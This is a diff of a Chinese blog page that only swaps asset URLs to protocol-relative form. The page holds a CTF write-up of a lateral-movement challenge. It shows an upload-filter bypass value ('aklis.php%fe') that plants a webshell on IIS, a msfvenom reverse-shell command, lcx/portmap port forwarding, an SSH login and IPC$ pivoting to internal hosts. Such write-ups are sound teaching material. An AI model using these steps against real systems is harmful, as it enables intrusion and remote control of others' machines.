@@ -19,20 +19,20 @@
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Pwnhub之深入敌后writeup">
-<meta property="og:url" content="http://0x48.pw/2017/01/17/0x2b/index.html">
+<meta property="og:url" content="//0x48.pw/2017/01/17/0x2b/index.html">
 <meta property="og:site_name" content="Hc1m1">
 <meta property="og:description" content="好艰难的一趟旅程">
-<meta property="og:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub1.png">
-<meta property="og:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub2.png">
-<meta property="og:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub3.png">
-<meta property="og:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub4.png">
-<meta property="og:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub5.png">
-<meta property="og:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub6.png">
-<meta property="og:updated_time" content="2018-04-02T11:10:19.931Z">
+<meta property="og:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub1.png">
+<meta property="og:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub2.png">
+<meta property="og:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub3.png">
+<meta property="og:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub4.png">
+<meta property="og:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub5.png">
+<meta property="og:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub6.png">
+<meta property="og:updated_time" content="2018-04-02T11:23:56.314Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pwnhub之深入敌后writeup">
 <meta name="twitter:description" content="好艰难的一趟旅程">
-<meta name="twitter:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub1.png">
+<meta name="twitter:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -41,7 +41,7 @@
 
 
 
-    <link rel="shortcut icon" href="/img/favicon.png">
+    <link rel="shortcut icon" href="//hcamael.oss-cn-beijing.aliyuncs.com/img/favicon.png">
 
 
 
@@ -116,7 +116,7 @@
 <div class="intrude-less">
     <header id="header" class="inner">
         <a href="/" class="profilepic">
-            <img src="/img/author.png" class="animated zoomIn">
+            <img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/author.png" class="animated zoomIn">
         </a>
         <hgroup>
           <h1 class="header-author"><a href="/">Hcamael</a></h1>
@@ -269,7 +269,7 @@
     <div class="intrude-less">
         <header id="header" class="inner">
             <a href="/" class="profilepic">
-                <img src="/img/author.png" class="animated zoomIn">
+                <img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/author.png" class="animated zoomIn">
             </a>
             <hgroup>
               <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
@@ -348,20 +348,20 @@
           
         <p>好艰难的一趟旅程</p>
 <a id="more"></a>
-<p><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub1.png" alt="pwnhub1"></p>
+<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub1.png" alt="pwnhub1"></p>
 <p>网站看看没啥发现, 端口扫扫也没啥发现</p>
 <p>然后用猪猪侠的<a href="https://github.com/ring04h/dirfuzz" target="_blank" rel="external">dirfuzz</a> 扫描路径, 可以扫到有<code>file/.hg</code>路径, 然后用<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">https://github.com/kost/dvcs-ripper</a> 可以搞到源码</p>
-<p><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub2.png" alt="pwnhub2"></p>
+<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub2.png" alt="pwnhub2"></p>
 <p>接下来就是代码审计一波</p>
 <p>漏洞点在<code>uploader.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	session_start();</div><div class="line">	 </div><div class="line">	// Get the filename and make sure it is valid</div><div class="line">	$filename = basename($_FILES[&apos;file&apos;][&apos;name&apos;]);</div><div class="line"></div><div class="line">	 </div><div class="line">	// Get the username and make sure it is valid</div><div class="line">	$username = $_SESSION[&apos;userName&apos;];</div><div class="line">	if (!preg_match(&apos;/^[\w_\-]+$/&apos;, $username) )&#123;</div><div class="line">		echo &quot;Invalid username&quot;;</div><div class="line">		header(&quot;Refresh: 2; url=files.php&quot;);</div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line">	 </div><div class="line">	if(isset($_POST[&apos;submit&apos;]))&#123;</div><div class="line">		$filename =md5(uniqid(rand()));</div><div class="line">		$filename = preg_replace(&quot;/[^\w]/i&quot;, &quot;&quot;, $filename);</div><div class="line">		$upfile = $_FILES[&apos;file&apos;][&apos;name&apos;];</div><div class="line">		$upfile = str_replace(&apos;;&apos;,&quot;&quot;,$upfile);</div><div class="line">		$tempfile = $_FILES[&apos;file&apos;][&apos;tmp_name&apos;];</div><div class="line">		$ext = trim(get_extension($upfile)); // null</div><div class="line">		if(in_array($ext,array(&apos;php&apos;,&apos;php3&apos;,&apos;php5&apos;,&apos;php7&apos;,&apos;phtml&apos;)))&#123;</div><div class="line">			die(&apos;Warning ! File type error..&apos;);</div><div class="line">		&#125;</div><div class="line">		if($ext == &apos;asp&apos; or $ext == &apos;asa&apos; or $ext == &apos;cer&apos; or $ext == &apos;cdx&apos; or $ext == &apos;aspx&apos; or $ext == &apos;htaccess&apos;) $ext = &apos;file&apos;;</div><div class="line"></div><div class="line">		$full_path = sprintf(&quot;./users_file_system/%s/%s.%s&quot;, $username, $filename,$ext);</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	</div><div class="line">	if (move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $full_path) )&#123;</div><div class="line">		header(&quot;Location: files.php&quot;);</div><div class="line">		exit;</div><div class="line">	&#125; else &#123;</div><div class="line">		header(&quot;Location: upload_failure.php&quot;);</div><div class="line">		</div><div class="line"></div><div class="line">		exit;</div><div class="line">	&#125;</div><div class="line"> 	function get_extension($file)&#123;</div><div class="line">		return strtolower(substr($file, strrpos($file, &apos;.&apos;)+1));</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
 <p>初看好像写的没问题, 但是之前随便看看站点的时候就发现了这是一个Windows server + IIS的站点</p>
 <p>然后这个上传漏洞以前遇到过, 还写过wp</p>
 <p><a href="http://old.lazysheep.cc/2015/05/19/0x24/" target="_blank" rel="external">http://old.lazysheep.cc/2015/05/19/0x24/</a></p>
 <p>然后通过Fuzz也可以bypass这个上传过滤, <code>aklis.php%fe</code>也可以成功上传php文件</p>
-<p><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub3.png" alt="pwnhub3"></p>
+<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub3.png" alt="pwnhub3"></p>
 <p>得到webshell以后, 用msf生成了个反弹shell的exe(aklis.exe)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ msfvenom -p windows/shell_reverse_tcp LHOST=xxxx LPORT=6666 -f exe -o /tmp/reverse.exe</div></pre></td></tr></table></figure>
-<p><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub4.png" alt="pwnhub4"></p>
+<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub4.png" alt="pwnhub4"></p>
 <p>找个内网的ip: <code>172.31.5.95</code>, 通过xshell对该目标进行ssh连接, 用户是ubuntu</p>
 <p>之后用的是<code>dlive</code>里的<code>lcx.exe</code>进行端口转发, 参考: </p>
 <p><a href="http://wps2015.org/drops/drops/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html" target="_blank" rel="external">http://wps2015.org/drops/drops/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html</a></p>
@@ -369,12 +369,12 @@
 <p>我的xxx机子的命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./portmap -m 2 -p1 10000 -p2 12345</div></pre></td></tr></table></figure></p>
 <p><code>portmap</code>是linux下的lcx, 下载地址:<a href="http://www.vuln.cn/2791" target="_blank" rel="external">http://www.vuln.cn/2791</a></p>
 <p>然后就是通过ssh进行连接了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ssh ubuntu@xxx -p12345</div><div class="line">password: abc@elk</div></pre></td></tr></table></figure></p>
-<p>密码从提示里知道的:<br><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub5.png" alt="pwnhub5"></p>
+<p>密码从提示里知道的:<br><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub5.png" alt="pwnhub5"></p>
 <p>在根目录下发现了flag, 本以为做出来了, 然后得知是假的, 简直奔溃……</p>
 <p>该ubuntu服务器, ubuntu用户可以sudo, 有root权限, 不过不能访问外面, 想装工具也不方便…</p>
 <p>然后在<code>/home/ubuntu/.bash_history</code>里找到了又一个内网ip: <code>172.31.13.133</code></p>
 <p>在<code>.bash_history</code>里也可以发现, <code>172.31.13.133</code>开了<code>135, 139, 445</code>三个端口</p>
-<p><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub6.png" alt="pwnhub6"></p>
+<p><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/pwnhub6.png" alt="pwnhub6"></p>
 <p>然后就进行了一系列的找相关漏洞, 把相应端口转发出来用msf测试, 未果….</p>
 <p>然后找到<a href="http://www.360doc.com/content/10/0211/10/551936_15658003.shtml" target="_blank" rel="external">$IPC相关命令</a></p>
 <p>在windows机子上使用命令:</p>
@@ -399,10 +399,10 @@
         <p><span>本文标题:</span><a href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
         <p><span>发布时间:</span>2017-01-17, 20:06:59</p>
-        <p><span>最后更新:</span>2018-04-02, 19:10:19</p>
+        <p><span>最后更新:</span>2018-04-02, 19:23:56</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/01/17/0x2b/" title="Pwnhub之深入敌后writeup">http://0x48.pw/2017/01/17/0x2b/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/01/17/0x2b/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/01/17/0x2b/" title="Pwnhub之深入敌后writeup">//0x48.pw/2017/01/17/0x2b/</a>
+            <span class="copy-path" data-clipboard-text="原文: //0x48.pw/2017/01/17/0x2b/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
 
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -518,7 +518,7 @@
             }
             else {
                 var backgroundnum = 4;
-                var backgroundimg = "url(/img/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                var backgroundimg = "url(//hcamael.oss-cn-beijing.aliyuncs.com/img/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
                 $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
             }
         })
